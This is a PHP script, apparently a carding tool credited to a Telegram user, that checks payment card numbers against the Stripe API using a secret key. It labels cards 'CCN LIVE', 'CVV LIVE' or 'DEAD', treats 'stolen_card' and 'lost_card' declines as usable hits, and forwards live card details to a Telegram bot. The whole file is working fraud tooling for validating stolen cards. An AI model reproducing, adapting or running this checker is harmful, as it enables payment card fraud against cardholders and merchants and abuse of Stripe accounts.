<?php
//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Include Setup]==========================================*/
include 'preset.php';

/*===[cURL Processes]=========================================*/
/* 1st cURL */
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv);
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
curl_close($ch1);

/* 1st cURL Response */
$res1 = json_decode($curl1, true);
$card = $res1['card']['id'];

if(isset($res1['id'])){
    /* 2nd cURL */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email='.$email.'&description=Tikol4Life&source='.$res1["id"].'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    curl_close($ch2);

    /* 2nd cURL Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
    
}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd cURL */
    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $curl3 = curl_exec($ch3);
    curl_close($ch3);

    /* 3rd cURL Response */
    $res3 = json_decode($curl3, true);

}


/*===[cURL Response Setup]====================================*/
if(isset($res1['error'])){
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;
    
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "1"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
            }
        }
        EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Lost Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Stolen Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        EchoMessage('DEAD',$cc_info.' >> SK Error: TestMode Charges ');
    }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //INTEGRATION ERROR
        EchoMessage('DEAD',$cc_info.' >> SK Error: Integration');
    }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        EchoMessage('DEAD',$cc_info.' >> SK Error: Verify Phone Number');
    }else{
        //DEAD
        EchoMessage('DEAD',$cc_info.' >> '.$err);
    }
}else{
    if (isset($res2['error'])) {
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "1"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
                }
            }
            EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }else{
            //DEAD
            EchoMessage('DEAD',$cc_info.' >> '.$err);
        }
    }else{
        if (isset($res2['sources'])) {
            $cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A",$telebot);
                    }
                }
                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res2);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res2);
            }
        }else{
            $cvc_res3 = $res3['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A",$telebot);
                    }
                }
                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res3);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res3);
            }
        }
    }
}

if ($testMode) {
    echo '<pre>';
    echo "1st cURL <br>";
    echo json_encode($res1, JSON_PRETTY_PRINT);
    if (isset($res1['id'])) {
        echo "<br><br>2nd cURL <br>";
        echo json_encode($res2, JSON_PRETTY_PRINT);
    }
    if (isset($res2['id'])&&!isset($res2['sources'])) {
        echo "<br><br>3rd cURL <br>";
        echo json_encode($res3, JSON_PRETTY_PRINT);
    }
}

?>